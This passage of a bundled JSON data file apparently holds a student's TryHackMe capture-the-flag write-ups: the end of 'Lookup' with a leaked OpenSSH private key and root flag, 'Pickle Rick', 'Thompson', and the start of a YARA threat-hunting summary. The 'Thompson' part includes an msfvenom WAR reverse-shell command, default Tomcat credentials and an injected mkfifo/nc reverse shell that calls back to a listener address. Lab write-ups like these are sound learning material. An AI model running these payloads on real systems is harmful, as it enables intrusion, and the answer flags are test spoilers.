PRIVATE KEY-----<br>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn<br>NhAAAAAwEAAQAAAYEAptm2+DipVfUMY+7g9Lcmf/h23TCH7qKRg4Penlti9RKW2XLSB5wR<br>Qcqy1zRFDKtRQGhfTq+YfVfboJBPCfKHdpQqM/zDb//ZlnlwCwKQ5XyTQU/vHfROfU0pnR<br>j7eIpw50J7PGPNG7RAgbP5tJ2NcsFYAifmxMrJPVR/+ybAIVbB+ya/D5r9DYPmatUTLlHD<br>bV55xi6YcfV7rjbOpjRj8hgubYgjL26BwszbaHKSkI+NcVNPmgquy5Xw8gh3XciFhNLqmd<br>ISF9fxn5i1vQDB318owoPPZB1rIuMPH3C0SIno42FiqFO/fb1/wPHGasBmLzZF6Fr8/EHC<br>4wRj9tqsMZfD8xkk2FACtmAFH90ZHXg5D+pwujPDQAuULODP8Koj4vaMKu2CgH3+8I3xRM<br>hufqHa1+Qe3Hu++7qISEWFHgzpRMFtjPFJEGRzzh2x8F+wozctvn3tcHRv321W5WJGgzhd<br>k5ECnuu8Jzpg25PEPKrvYf+lMUQebQSncpcrffr9AAAFiJB/j92Qf4/dAAAAB3NzaC1yc2<br>EAAAGBAKbZtvg4qVX1DGPu4PS3Jn/4dt0wh+6ikYOD3p5bYvUSltly0gecEUHKstc0RQyr<br>UUBoX06vmH1X26CQTwnyh3aUKjP8w2//2ZZ5cAsCkOV8k0FP7x30Tn1NKZ0Y+3iKcOdCez<br>xjzRu0QIGz+bSdjXLBWAIn5sTKyT1Uf/smwCFWwfsmvw+a/Q2D5mrVEy5Rw21eecYumHH1<br>e642zqY0Y/IYLm2IIy9ugcLM22hykpCPjXFTT5oKrsuV8PIId13IhYTS6pnSEhfX8Z+Ytb<br>0Awd9fKMKDz2QdayLjDx9wtEiJ6ONhYqhTv329f8DxxmrAZi82Reha/PxBwuMEY/barDGX<br>w/MZJNhQArZgBR/dGR14OQ/qcLozw0ALlCzgz/CqI+L2jCrtgoB9/vCN8UTIbn6h2tfkHt<br>x7vvu6iEhFhR4M6UTBbYzxSRBkc84dsfBfsKM3Lb597XB0b99tVuViRoM4XZORAp7rvCc6<br>YNuTxDyq72H/pTFEHm0Ep3KXK336/QAAAAMBAAEAAAGBAJ4t2wO6G/eMyIFZL1Vw6QP7Vx<br>zdbJE0+AUZmIzCkK9MP0zJSQrDz6xy8VeKi0e2huIr0Oc1G7kA+QtgpD4G+pvVXalJoTLl<br>+K9qU2lstleJ4cTSdhwMx/iMlb4EuCsP/HeSFGktKH9yRJFyQXIUx8uaNshcca/xnBUTrf<br>05QH6a1G44znuJ8QvGF0UC2htYkpB2N7ZF6GppUybXeNQi6PnUKPfYT5shBc3bDssXi5GX<br>Nn3QgK/GHu6NKQ8cLaXwefRUD6NBOERQtwTwQtQN+n/xIs77kmvCyYOxzyzgWoS2zkhXUz<br>YZyzk8d2PahjPmWcGW3j3AU3A3ncHd7ga8K9zdyoyp6nCF+VF96DpZSpS2Oca3T8yltaR1<br>1fkofhBy75ijNQTXUHhAwuDaN5/zGfO+HS6iQ1YWYiXVZzPsktV4kFpKkUMklC9VjlFjPi<br>t1zMCGVDXu2qgfoxwsxRwknKUt75osVPN9HNAU3LVqviencqvNkyPX9WXpb+z7GUf7FQAA<br>AMEAytl5PGb1fSnUYB2Q+GKyEk/SGmRdzV07LiF9FgHMCsEJEenk6rArffc2FaltHYQ/Hz<br>w/GnQakUjYQTNnUIUqcxC59SvbfAKf6nbpYHzjmWxXnOvkoJ7cYZ/sYo5y2Ynt2QcjeFxn<br>vD9I8ACJBVQ8LYUffvuQUHYTTkQO1TnptZeWX7IQml0SgvucgXdLekMNu6aqIh71AoZYCj<br>rirB3Y5jjhhzwgIK7GNQ7oUe9GsErmZjD4c4KueznC5r+tQXu3AAAAwQDWGTkRzOeKRxE/<br>C6vFoWfAj3PbqlUmS6clPOYg3Mi3PTf3HyooQiSC2T7pK82NBDUQjicTSsZcvVK38vKm06<br>K6fle+0TgQyUjQWJjJCdHwhqph//UKYoycotdP+nBin4x988i1W3lPXzP3vNdFEn5nXd10<br>5qIRkVl1JvJEvrjOd+0N2yYpQOE3Qura055oA59h7u+PnptyCh5Y8g7O+yfLdw3TzZlR5T<br>DJC9mqI25np/PtAKNBEuDGDGmOnzdU47sAAADBAMeBRAhIS+rM/ZuxZL54t/YL3UwEuQis<br>sJP2G3w1YK7270zGWmm1LlbavbIX4k0u/V1VIjZnWWimncpl+Lhj8qeqwdoAsCv1IHjfVF<br>dhIPjNOOghtbrg0vvARsMSX5FEgJxlo/FTw54p7OmkKMDJREctLQTJC0jRRRXhEpxw51cL<br>3qXILoUzSmRum2r6eTHXVZbbX2NCBj7uH2PUgpzso9m7qdf7nb7BKkR585f4pUuI01pUD0<br>DgTNYOtefYf4OEpwAAABFyb290QHVidW50dXNlcnZlcg==<br>-----END OPENSSH PRIVATE KEY-----<br></pre></p>","<p><img src=\\"/cyber/writeup/lookup/jackpot.jpg\\" alt=\\"\\"></p>","<p>The last this to do is to copy the key and paste on my local kali in a file name id_rsa to attempt to log in with SSH as root, <code>ssh -i ./id_rsa root@10.10.159.232</code></p>","<p><pre>$ ssh -i ./id_rsa root@10.10.159.232<br>Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-156-generic x86_64)<br><br> * Documentation:  https://help.ubuntu.com<br> * Management:     https://landscape.canonical.com<br> * Support:        https://ubuntu.com/advantage<br><br>  System information as of Thu 30 Jan 2025 04:59:02 PM UTC<br><br>  System load:  0.0               Processes:             132<br>  Usage of /:   59.7% of 9.75GB   Users logged in:       1<br>  Memory usage: 11%               IPv4 address for ens5: 10.10.159.232<br>  Swap usage:   0%<br><br><br>Expanded Security Maintenance for Applications is not enabled.<br><br>7 updates can be applied immediately.<br>To see these additional updates run: apt list --upgradable<br><br>Enable ESM Apps to receive additional future security updates.<br>See https://ubuntu.com/esm or run: sudo pro status<br><br><br>The list of available updates is more than a week old.<br>To check for new updates run: sudo apt update<br>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings<br><br><br>Last login: Mon May 13 10:00:24 2024 from 192.168.14.1<br><b style=\'color:red\'>root@lookup</b>:~# whoami<br>root<br><b style=\'color:red\'>root@lookup</b>:~# cat root.txt<br>5a285a9f257e45c68bb6c9f9f57d18e8<br></pre></p>"]}]}]}')},2554:e=>{"use strict";e.exports=JSON.parse('{"note":"title must match route name in App.js","title":"Pickle Rick","path":"pickle-rick","tags":["easy","security","ctf","bash","web","linux","thm"],"date":"AUG 2024","location":"./writeup/","banner":"writeup/picklerick/banner.gif","type":"writeup","search":[{"section":"Enumeration","description":"Sccanning with Nmap and discovering port 22 SSH and port 80 HTTP open"},{"section":"Enumeration","description":"Directory brute forcing with Gobuster using seclist wordlist and -x option for file extentions"},{"section":"Restricted SHELL","description":"Privilege escalation (privesc) by listing allowed command executable with sudo"},{"section":"Restricted SHELL","description":"Bypassing restricted shell to read ingredient files"}],"body":[{"id":"Pickle Rick","title":"<h1><span style=\\"color:#da1953\\">Pic</span>kle Rick</h1><hr>","body":[{"id":"banner","title":"","body":["<img src=\\"/cyber/writeup/picklerick/banner.gif\\" alt=\\"\\">","<p>This Rick and Morty-themed challenge requires you to exploit a web server and find three ingredients to help Rick make his potion and transform himself back into a human from a pickle.</p>"]},{"id":"Enumeration","title":"<hr><h1><span style=\\"color:#da1953\\">Enu</span>meration</h1>","body":["<p>The first step in the enumeration that I do is always enumerating the box with <code>Nmap</code>. The command that I used is: <code>nmap -sC -V -oN nmap-script &lt;ip&gt; -p-</code> I always use the flag <code>-oN</code> to save the Nmap result for later review. The rest Nmap gave me was:</p>","<p><pre>┌──(kali㉿kali)-[192.168.213.128]-[13:48:38 12/09/2024]-[~/thm/pickle-rick] <br>└─$ nmap -sC -sV -oN snmap-scan [ip] -p- <br># Nmap 7.94SVN scan initiated Thu Sep 12 13:06:31 2024 as: nmap -sC -sV -oN nmap-scan 10.10.96.74<br>Nmap scan report for 10.10.96.74<br>Host is up (0.023s latency).<br>Not shown: 998 closed tcp ports (conn-refused)<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   3072 b7:33:d5:d9:db:e0:81:a9:f8:5d:a4:4f:36:16:a3:4a (RSA)<br>|   256 6a:e2:88:84:d1:1a:b0:8b:bd:e3:de:20:99:e9:bb:f8 (ECDSA)<br>|_  256 15:ba:da:57:13:f0:27:8b:0a:ab:c5:f2:1e:16:41:21 (ED25519)<br>80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))<br>|_http-title: Rick is sup4r cool<br>|_http-server-header: Apache/2.4.41 (Ubuntu)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br># Nmap done at Thu Sep 12 13:06:39 2024 -- 1 IP address (1 host up) scanned in 7.96 seconds<br><br></pre></p>","<p>So now we have two services: SSH and HTTP. At this point, I know that I can\'t use SSH because I do not have any credentials or SSH keys, so it\'s better not to even try it. Let\'s go with the HTTP service. The best way is to paste the IP address into a browser to check the website.</p>","<p><img src=\\"/cyber/writeup/picklerick/9b0024882c2a483abf006a957b0cd521.png\\"></p>","<p>It is a simple page with a description and an image. At first glance, it seems nothing is interesting. From here we can do a few things to enumerate the website:</p>","<ol><li>check source code</li><li>check cookies</li><li>check eventual javascript files</li><li>monitor the communication with BurpSuite</li><li>directory brute forcing</li><li>the 6th idea came into my mind later, not immediately. I will discuss it later in the writeup</li></ol>","<p>To be more efficient I run first of all directory brute forcing with <code>gobuster</code>:</p>","<pre>gobuster dir -u http://10.10.181.218/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt </pre>","<p>And the rest was the discovery of the <code>/asset</code> directory path, which was very disappointing.<br>","<p><img src=\\"/cyber/writeup/picklerick/e560f71aeb5d4d07936f68004469d3f6.png\\"></p>","<p>I will get back to this result later.</p>","<p>While <code>gobuster</code> was running I was assessing the website manually (points 1, 2 and 3 previously mentioned). Checking the source code I found a comment exposing the user name.</p>","<img src=\\"/cyber/writeup/picklerick/077a28ad3abb4749a3d763cc5e7042c1.png\\">","<p>Easy peasy, I got the username!</p>","<img src=\\"/cyber/writeup/picklerick/ef9f5ac16ca74257b228917e48af302c.png\\">","<p>The first step is done! The second step is checking the cookies. But the site has no cookies.</p>","<p><img src=\\"/cyber/writeup/picklerick/2aa969a5929c43c1a2a3e89c811623b6.png\\"></p>","<p><img src=\\"/cyber/writeup/picklerick/a47731de72cc4febafb98bcf5a79189b.png\\"</p>","<p>The third step is to check any javascript files. But there were only JS libraries used to create the website, the standard bootstrap JS files, nothing interesting.</p>","<p><img src=\\"/cyber/writeup/picklerick/e8a1b12ebba9478f916b2a1cd0c91a87.png\\"</p>","<p><img src=\\"/cyber/writeup/picklerick/b09716ab63b74464975dcf6966a87eb1.png\\"</p>","<p>At this point I started to lose hope, how can an easy box put me in such a difficult position?</p>","<img src=\\"/cyber/writeup/picklerick/250b2e46e84346a78c088cfd979a282b.png\\">","<p>In the meantime, BurpSuite logged a few interactions with the website but I did not find anything interesting. I was hoping to find some GET and POST parameters like user or admin parameter to elevate my privilege but no such thing was implemented.</p>","<img src=\\"/cyber/writeup/picklerick/90ae686a1e294f6db722c52140bf9bc9.png\\">","<p>I even tried manually to access some paths as you can see from the screenshot such as</p>","<ul><li>/management</li><li>/panel</li><li>/apache</li><li>/console</li></ul>","<p>And none of them worked. At this moment I remembered about <em>robots.txt</em> the 6th point that was missing from the above list. The <b>robots.txt</b> disclosed an alphabetic string: <strong>Wubbalubbadubdub</strong>. As I found the username earlier maybe this could be the password, but I didn\'t give it for granted it can be a rabbit hole.</p>","<p>Having these 2 findings, the username and a possible password I started to play for almost 1 hour with the SSH service trying to log in. It gave me several error messages and I tried to fix them and eventually I gave up on SSH and went back to the website. The SSH service was a rabbit hole and it lost 1 hour of my time but it enhanced my ability to detect rabbit holes. It was not totally useless and I learnt a few things about SSH config files as well, who knows it may came in handy in future challenges.</p>","<img src=\\"/cyber/writeup/picklerick/e09a517beea740128d38c8df0757f75a.png\\">","<p>At this point, I checked the <code >gobuster</code> result and it shows <code>/asset</code>. By accessing it I can see some static files like image files, javascript and CSS.</p>","<img src=\\"/cyber/writeup/picklerick/e31eb957e2fc451ca5a90e5a445c8809.png\\">","<p>I admit at this point I was tempted to take a peek at the solution but I resisted! So far I have checked all the 6 points listed. Given the number of images, I thought there may be some steganography challenge, so I downloaded a few images and I tried to see if the images had some information in string format inside the images with the command <code>strings</code>: <code>strings &lt;filename&gt;</code>; <code>strings portal.jpg</code> Also this attempt failed.</p>","<img src=\\"/cyber/writeup/picklerick/9b987dea25f4429fa5952f0035e4df6a.png\\">","<p>I searched on Google for <em>web enumeration</em> and read a few pages about people doing web enumeration of other challenges and I noticed they were using <code>seclists</code> wordlist. I immediately installed <code>seclists</code> by typing <code>sudo apt install seclists</code>. I ran Gobuster again, and while I was reading the available options, one in particular caught my eye, the <code>-x</code> that I used to use. This option looks for files ending with a certain extension. <code>-x,  --extensions string /t/t File extension(s) to search for</code>. I returned to Gobuster with pretty much identical flags and the same wordlist this time from a different path and I added <code>-x txt,php</code>. Now why did I add .php? It was just an educated guess as most of the boxes that I played had PHP. I was also tempted to add more extensions such as .pdf, .js, and .css but they are not useful to me and they will certainly make it run slower. So the command I ran was:</p>","<p><code>gobuster dir -u http://10.10.61.243/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x txt,php</code> This time the result was very different. I did not let Gobuster go through the whole wordlist as it started to give me errors so I stopped it.</p>","<img src=\\"/cyber/writeup/picklerick/2643da1c9c5d48868aeb26ed518ecba4.png\\">","<p>This new finding brought immediately my morale up! I tried <b>portal.php</b> and <b>login.php</b> both ended up in <b>login.php</b>. Inserting the username and the string <strong>Wubbalubbadubdub</strong> logged me into a page where I can run bash commands.</p>","<img src=\\"/cyber/writeup/picklerick/c6f964976a24417083e1754a280b9b71.png\\"><br>"]},{"id":"Restricted SHELL","title":"<h1><span style=\\"color:#da1953\\">Res</span>tricted SHELL</h1>","body":["<p>Now is the time to read the file and search for the ingredients. First thing is <code>ls</code> list the directory to see what files it contains and immediately I can see it has a file named <strong>Sup3rS3cretPickl3Ingred.txt</strong>. Trying to <code>cat</code> it I receive the following error message.</p>","<img src=\\"/cyber/writeup/picklerick/0bbba0bcb55049eb9a3689f871cb918c.png\\">","<p>Damn! I can\'t use the <code>cat</code> command! Wait a minute... I know more commands to achieve similar results thanks to my experiences with Linux and they are:</p>","<ul><li>more</li><li>less</li><li>strings</li><li>vim</li><li>nano</li><li>vi</li></ul>","<p>Note that I listed 3 text editors as well, my idea was to try to open the file with one of the text editors to see the content. Among all the commands listed the command <code>less</code> worded for the first ingredient and later on I found out that the command <code>strings</code> works for all the ingredients so I will use the command <code>strings</code>.</p>","<p>The first ingredient is done now tome to look for the other two. After exploring the system I found out that the second ingredient is in Rick\'s home directory.</p>","<img src=\\"/cyber/writeup/picklerick/88916f0602614fc687c881f91984417a.png\\">","<p>Let\'s try to read it with <code>strings</code>. Trying to read the file with the following command <code>strings /home/rick/second ingredient</code> gives me empty results.</p>","<img src=\\"/cyber/writeup/picklerick/69dbeb99663748c0a095197d7540af6d.png\\">","<p>How come? I know it! Thanks to a bash CTF that I have done when I started my journey in the Cybersecurity field I had to face a similar challenge. The CTF is called <strong>OverTheWire</strong> and the level was <strong>Bandit</strong>. The issue is with the space in the file name. By wrapping it with quotes it solves the issue. <code>strings &quot;/home/rick/second ingredients&quot;</code></p>","<img src=\\"/cyber/writeup/picklerick/972094d0419940e8be2c04439dfb37de.png\\">","<p>Now it\'s time to find the 3rd ingredient. After spending some time I tried to access the root folder but I could not. So as I used to do during privilege escalation in other boxes I ran <code>sudo -l</code> and surprisingly I had the following output.</p>","<img src=\\"/cyber/writeup/picklerick/d1bc4148d2cf4d07b6fc17add34f4021.png\\">","<p>I can run any command as sudo! So the command that I have to run is <code>sudo ls /root</code> and I can see the name of the 3rd ingredient.</p>","<img src=\\"/cyber/writeup/picklerick/2f20d7cadd9f4c22b273844bad5fff5b.png\\">","<p>Now let\'s try to read it <code>sudo strings /root/3rd.txt</code></p>","<img src=\\"/cyber/writeup/picklerick/53c856177d8b4a089b6dfca3cebc9553.png\\">","<p>And finally here is the 3rd ingredient.</p>","<img src=\\"/cyber/writeup/picklerick/1fa8d0f9018b44588079e66b888732ee.png\\"><br>"]},{"id":"Takeaway","title":"<h1><span style=\\"color:#da1953\\">Tak</span>eaway</h1>","body":["<p>During the challenge at a certain point, I thought I had to obtain a reverse shell and spent almost 2 hours trying to achieve it via the browser and BurpSuite. I tried various techniques, strategies and different encoding but they did not work. I also tried to upload a reverse shell which did not work as well.</p>","<p>During all these failed attepts I learned other things even if they were not related to the completion of the challenge. But for sure the time spent for on the failed attempts was not wasted at all. I took my time to assess the website thoroughly, I did my research without rushing it. When needed I took a peek at the solution as long as it helped me to learn. The key is patience. Also, I was able to finish the challenge very quickly once I took my lunch break, seems my mind cleared.</p>"]}]}]}')},5959:e=>{"use strict";e.exports=JSON.parse('{"note":"title must match route name in App.js","title":"Thompson","path":"thompson","tags":["easy","ctf","oscp","box","thm","web","nsfvenom","linux","privesc","login panel","nc","rce","reverse shell","upgrade shell","user enumeration"],"date":"JAN 2025","location":"./writeup/","banner":"writeup/thompson/banner.gif","type":"writeup","search":[{"section":"Scanning","description":"Scanning with nmap and finding the host exposing posts 22 ssh, 8009 ajp13, and 8080 http"},{"section":"Tomcat credentials","description":"Guessing Tomcat Manager panel credential from a common credals list for Tomcat via manual user and passowrd enumeration"},{"section":"Revers shell","description":"Creating malicious WAR file with msfvenom for reverse shell"},{"section":"Revers shell","description":"Upgrading from non interactive shell to fully interactive shell with Bahs (no Python)"},{"section":"Code execution","description":"Hijacking and redirecting code execution injecting malicious command to enumerate users and system"},{"section":"Code execution","description":"Injecting malicious code to execute reverse shell as admin"}],"body":[{"id":"Thompson","title":"<h1> <span style=\\"color:#da1953\\">Tho</span>mpson</h1><hr>","body":[{"id":"banner","title":"","body":["<img src=\\"/cyber/writeup/thompson/banner.gif\\" alt=\\"\\">"]},{"id":"Scanning","title":"<hr><h1><span style=\\"color:#da1953\\">Sca</span>nning</h1>","body":["<p><pre># Nmap 7.94SVN scan initiated Thu Feb  6 08:32:29 2025 as: nmap -sC -sV -oN nmap 10.10.23.2<br>Nmap scan report for 10.10.23.2<br>Host is up (0.025s latency).<br>Not shown: 997 closed tcp ports (conn-refused)<br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 fc:05:24:81:98:7e:b8:db:05:92:a6:e7:8e:b0:21:11 (RSA)<br>|   256 60:c8:40:ab:b0:09:84:3d:46:64:61:13:fa:bc:1f:be (ECDSA)<br>|_  256 b5:52:7e:9c:01:9b:98:0c:73:59:20:35:ee:23:f1:a5 (ED25519)<br>8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)<br>|_ajp-methods: Failed to get a valid response for the OPTION request<br>8080/tcp open  http    Apache Tomcat 8.5.5<br>|_http-favicon: Apache Tomcat<br>|_http-title: Apache Tomcat/8.5.5<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br># Nmap done at Thu Feb  6 08:32:37 2025 -- 1 IP address (1 host up) scanned in 8.30 seconds</pre></p>","<p>I have 3 pen ports: 22 ssh, 8009 ajp13 (Apache Jserv) and 8080 http (Tomcat).</p>"]},{"id":"Tomcat credentials","title":"<h1><span style=\\"color:#da1953\\">Tom</span>cat credentials</h1>","body":["<p>Accesssing the address <i>http://challenge.ip:8080</i> I am able to access the tomcat home page.</p>","<p><img src=\\"/cyber/writeup/thompson/tomcathome.PNG\\"></p>","<p>By Clicking \\"Manage App\\" I can attemp a log into the admin panel.</p>","<p><img src=\\"/cyber/writeup/thompson/login.PNG\\"></p>","<p>The default credentials are <b>tomcat:s3cret</b> which I guessed tried some common combination of username and password form this <a href=\\"https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown\\">link</a>.</p>","<p>Once logged in I had the possibility to upload a WAR file.</p>","<p><img src=\\"/cyber/writeup/thompson/upload.jpg\\"></p>"]},{"id":"Reverse Shell","title":"<h1><span style=\\"color:#da1953\\">Rev</span>ers shell</h1>","body":["<p>To craft the WAR file I have used MSFVENOM, and I found the comand line on <a href=\\"https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/\\">Google</a>. The line I used was \\"non-meterpreter web payload (WAR)\\": <code>msfvenom -p java/jsp_shell_reverse_tcp LHOST&lt;IP&gt; LPORT=&lt;PORT&gt; -f war &gt; shell.<br>ENTER<br>ENTER</code>. Once created the file and uploaded I started a NetCat linstener and then visited the uploaded WAR file Link.</p>","<p><img src=\\"/cyber/writeup/thompson/reverseshell.PNG\\"></p>","<p>I have a non interative shell. To upgrade it to an interactive shell I used the fllowing commands:</p>","<p><pre>/usr/bin/script -qc /bin/bash /dev/null<br>CTRZ+Z<br>stty raw -echo; fg; reset</pre></p>","<p><img src=\\"/cyber/writeup/thompson/upgradedshell.PNG\\"></p>",""]},{"id":"Code execution","title":"<h1><span style=\\"color:#da1953\\">Cod</span>e execution</h1>","body":["<p>Obviously, the first thing that came to my mind was to look for the user flag in the home directory.</p>","<p><pre>tomcat@ubuntu:/$ cd /home/jack/<br>tomcat@ubuntu:/home/jack$ ls -la<br>total 48<br>drwxr-xr-x 4 jack jack 4096 Aug 23  2019 .<br>drwxr-xr-x 3 root root 4096 Aug 14  2019 ..<br>-rw------- 1 root root 1476 Aug 14  2019 .bash_history<br>-rw-r--r-- 1 jack jack  220 Aug 14  2019 .bash_logout<br>-rw-r--r-- 1 jack jack 3771 Aug 14  2019 .bashrc<br>drwx------ 2 jack jack 4096 Aug 14  2019 .cache<br>-rwxrwxrwx 1 jack jack   26 Aug 14  2019 id.sh<br>drwxrwxr-x 2 jack jack 4096 Aug 14  2019 .nano<br>-rw-r--r-- 1 jack jack  655 Aug 14  2019 .profile<br>-rw-r--r-- 1 jack jack    0 Aug 14  2019 .sudo_as_admin_successful<br>-rw-r--r-- 1 root root   39 Feb  7 05:14 test.txt<br>-rw-rw-r-- 1 jack jack   33 Aug 14  2019 user.txt<br>-rw-r--r-- 1 root root  183 Aug 14  2019 .wget-hsts</pre></p>","<p>Here I can see that not only I am able to retrieve the flag but there is a script name <b>id.sh</b> that has read and write permission. By opening the file it is clear that it is executing the command <b>id</b> and saving the output in the file named <i>text.txt</i>.</p>","<p><pre>tomcat@ubuntu:/home/jack$ cat user.txt<br>39400c90bc683a41a8935e4719f181bf</pre></p>","<p><pre>tomcat@ubuntu:/home/jack$ cat id.sh<br>#!/bin/bash<br>id > test.txt</pre></p>","<p>Having read and write permission on <i>id.sh</i> I was able to enumerate the sudo privilege to check which command the user jack was able to execute as sudo without the password. The command used to enumerate was <code>sudo -l</code> and the command used to inject the code inside the <i>id.sh</i> file was <code>echo -e \'#!/bin/bash\'\\"\\\\nsudo -l > text.txt\\" > /home/jack/id.sh</code></p>","<p><pre>tomcat@ubuntu: echo -e \'#!/bin/bash\'\\"\\nsudo -l > text.txt\\" > /home/jack/id.sh              <br>tomcat@ubuntu:/home/jack$ cat id.sh <br>#!/bin/bash<br>sudo -l > text.txt<br>tomcat@ubuntu:/home/jack$ cat text.txt <br>Matching Defaults entries for root on ubuntu:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\\\\:/usr/local/bin\\\\:/usr/sbin\\\\:/usr/bin\\\\:/sbin\\\\:/bin\\\\:/snap/bin<br><br>User root may run the following commands on ubuntu:<br>    (ALL : ALL) ALL</pre></p>"]},{"id":"Shell as root","title":"<h1><span style=\\"color:#da1953\\">Shel</span>l as root</h1>","body":["<p>This means that I can execute all commands as sudo without the password. It also means that I can execute a reverse shell with <b>sudo</b> to obtain access as root. The command to inject the payload is: <code>echo -e \'#!/bin/bash\'\\"\\nsudo rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.21.112.161 5555 >/tmp/f\\" > /home/jack/id.sh</code>. Before executing the command I have to open a NetCat (NC) listener on port 5555 matching the payload port number.</p>","<p><pre><b>$</b> nc -lvnp 5555<br>listening on [any] 5555 ...<br>connect to [10.21.112.161] from (UNKNOWN) [10.10.247.245] 38362<br>/bin/sh: 0: can\'t access tty; job control turned off<br># whoami<br>root<br># cat /root/root.txt<br>d89d5391984c0450a95497153ae7ca3a  </pre></p>"]}]}]}')},1964:e=>{"use strict";e.exports=JSON.parse('{"note":"title must match route name in App.js","title":"Threat Hunting With YARA","path":"threat-hunting-with-yara","tags":["medium","walktrough","threat hunting","blue team","yara","thm","investigation","malware","ioc","malware detection"],"date":"OCT 2024","location":"./writeup/","banner":"writeup/threathuntingwithyara/banner.gif","type":"writeup","search":[{"section":"Structured Hunting","description":"Describing hypotheses based approach to identify attack patterns, leveraging YARA rules, SIEM queries, and MISP or AlienVault. It\'s ideal for post-compromise investigations and analyzing new threats, such as detecting malware inspired by recent attack reports."},{"sectio":"Situational/Entity-Driven Hunting","description":"Describe how to combine structured and unstructure hunting to respond to new threat and adapt to specific situation leveraging MITRE ATT&CK to protect assets. "},{"section":"Trigger","description":"Explains what a trigger is during threaat hunting."},{"section":"Investigation","description":"Explain briefly how to investiate the compromisison."},{"section":"Opportunities","description":"Example of structure and situational threat hunting scenario."},{"section":"YARA Rule Introduction","description":"Introductio to Yara rules."},{"section":"Structure of a YARA Rule","description":"Structure of Yara rules: Rule name, Meta, Strings and Condition."},{"section":"Example of a YARA Rule","description":"Yara rule example and explanation of all it\'s parts."},{"section":"Yara Strings and Conditions","description":"Example of different conditions matching of strings in Yara rules Condition section and regular expression."},{"section":"Conditions","description":"Exaustive silt of Yara rule conditions examples."},{"section":"Basic Syntax for YARA","description":"Yara rule command line arguments."},{"section":"Combine Multiple Rules in One File","description":"How to combine multiple Yara rules in one file, when and when not to do it."},{"section":"Indicators of Compromise Detected","description":"Steps to follow when indentified clear indication of compromise."},{"section":"Indicators of Compromise Detected","description":"Recommendiation for Threat Hunting."},{"section":"YARA: Hands-on Exercise","description":"Yara rule hands on exercise with solution."}],"body":[{"id":"","title":"<h1><span style=\\"color:#da1953\\">Thr</span>eat Hunting With YARA<hr>","body":[{"id":"banner","title":"","body":["<img src=\\"/cyber/writeup/threathuntingwithyara/banner.gif\\" alt=\\"\\">","<p>This is a summary of the room <em>Threat Hunting with YARA</em> on Try Hack Me</p>"]},{"id":"Introduction","title":"<hr><h1><span style=\\"color:#da1953\\">Int</span>roduction</h1>","body":[{"id":"Learning Objectives","title":"<h2>Learning Objectives</h2>","body":["<p><ul><li>Looking for actionable information that can be used to search for threats</li><li>Installing YARA</li><li>Creating a YARA rule</li><li>Deploying a YARA rule</li></ul></p>"]},{"id":"Prerequisites","title":"<h2>Prerequisites</h2>","body":["<p><ul><li>Basic understanding of security concepts including but not limited to Cyber Kill Chain, TTPs, Indicator of Compromise, Hashes, and APTs.</li><li>Basic understanding of using the Windows command line and PowerShell.</li><li>Basic understanding of data types and encoding.</li></ul></p>"]},{"id":"Answer the question below pt.1","title":"<h2>Answer the question below</h2>","body":["<p><b>Q:</B><i> What technique does ID T1134 describe?</i><br><b>A:</b> <i>Access Token Manipulation</i></p>","<p><b>Q:</b> <i>What does the detection rule M_APT_Dropper_Rootsaw_Obfuscated detect?</i><br><b>A:</b> <i>Detects obfuscated ROOTSAW payloads</i></p>"]}]},{"id":"Opportunities for Threat Hunting","title":"<h1><span style=\\"color:#da1953\\">Opp</span>ortunities for Threat Hunting</h1>","body":["<p>There are mainly 3 types of Threat Hunting: Structured, Unstructured and Situational and they employed depending on the situation.</p>","<p><img src=\\"/cyber/writeup/threathuntingwithyara/2b3ab1f4cb664f8d86e450d8dac29909.png\\"></p>",{"id":"Structured Hunting","title":"<h2>Structured Hunting</h2>","body":["<p>This approach starts with a plan or hypothesis based on known attacker behaviors and strategies. You’re looking for specific patterns or signs that show an attack might be starting.</p>","<p>How it works:</p>","<p><ul><li>Searches are powered by tools like YARA rules (to find patterns) or queries in a SIEM (to analyze logs).</li><li>Relies on external sources, like ecurity blogs or platforms that share attack details (e.g., MISP or AlienVault).</li></ul></p>","<p>Why it’s useful:</p>","<p><ul><li>It’s good for investigating after a possible compromise or when new threats are reported.</li></ul><p>Example:</p><ul><li>List itemFinding alware on a server after reading a blog about a similar attack.</li></ul></p>"]},{"id":"Situational/Entity-Driven Hunting","title":"<h2>Situational/Entity-Driven Hunting</h2>","body":["<p>This combines the first two approaches and focuses on what’s relevant right now for your organization. It responds to new threats or specific situations, like industry-specific risks or targeted reports.</p>","<p>How it works:</p>","<p><ul><li>Starts with a hypothesis about who might attack and what they’ll target.</li><li>Focuses on protecting your most critical assets (e.g., financial data or customer info).</li><li>Uses tools like the MITRE ATT&amp;CK framework and past attack data.</li></ul></p>","<p>Why it’s good:</p>","</p><ul><li>List itemIt adapts to current threats, making it highly focused and relevant.</li></ul><p>Example:</p><ul><li>If your industry is being targeted by a ransomware group, you look for signs of their activity in your systems.</li></ul></p>"]}]},{"id":"Threat Hunting Process","title":"<h1><span style=\\"color:#da1953\\">Thr</span>eat Hunting Process</h1>","body":["<p><img 